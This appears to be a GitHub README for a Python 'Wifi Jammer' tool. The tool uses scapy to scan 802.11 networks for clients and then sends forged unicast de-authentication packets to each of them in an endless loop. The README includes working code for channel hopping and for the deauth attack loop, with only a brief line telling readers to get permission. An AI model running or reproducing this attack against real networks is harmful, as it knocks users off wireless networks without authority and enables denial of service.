# 802.11 Wifi Jammer
**Infinitely disconnects clients one by one from a 802.11 network**

**This program does send a broadcast de-auth packet using the networks bssid as it is REALLY INEFFECTIVE and rarely works. INSTEAD this program scans the selected network for clients and adds those clients into a list, then infinitely loops through the clients list to send UNICAST DE-AUTH packets to specified clients which in turn in very effective**


**! <ins>DO NOT USE ON A NETWORK WITHOUT PRIOR PERMISSION</ins> !**

Prerequisites
-------------

* Wireless adapter supporting monitor mode and packet injection
* Python with ***scapy*** and ***colorama*** installed

Usage 
------
``` shell
python jammer.py <interface> <noise_filter_flag>
```
* The interface mentioned should have monitor mode already ON.
* The noise_filter_flag could be either 1 (True : noise filter is on) or 0 (False: noise filter is off)
  
Example:
``` shell
python jammer.py wlan0mon 1
```
How To Use
-----------

**The programs works in a three step process:**

### 1) Scanning APs:

* sniffs beacons frames using scapy on the specified interface
* channel hopping is done through a hopper thread which terminates through a daemon boolean flag
``` shell
def channelHopper():	
    while True: 
        channel = random.choice(channels)
        os.system("iw dev wlan0 set channel {}".format(channel))
        with lock:	
            global CURRENT_CHANNEL
            CURRENT_CHANNEL = channel
        if not(daemonFlag):
        	break 
        time.sleep(0.2)
```
### 2) Scanning Selected Network For Clients:
**This involves switching over to the channel of the selected network and extracting for clients bssid using these radio packets:** 
* Qos Frame
* Qos with CCMP Frame
* Control Block Frame
* Null Frame

This is achieved using the **clientFilter** function:

https://github.com/ary27x/WIFI_JAMMER/blob/3aaf282f24d69eee91449ad566a4b627701ea4e0/jammer.py#L130

### 3) Sending De-Authentication Packets:

**Finally the program infinitely loops through the clients list and sends forged de-authentication packet to each through layer 2**

``` shell
while True:
    for client in clients:
        packet = RadioTap()/Dot11(addr1 = client, addr2 = MAC , addr3 = MAC)/Dot11Deauth()
        sendp(packet , iface = IFACE)
```





  




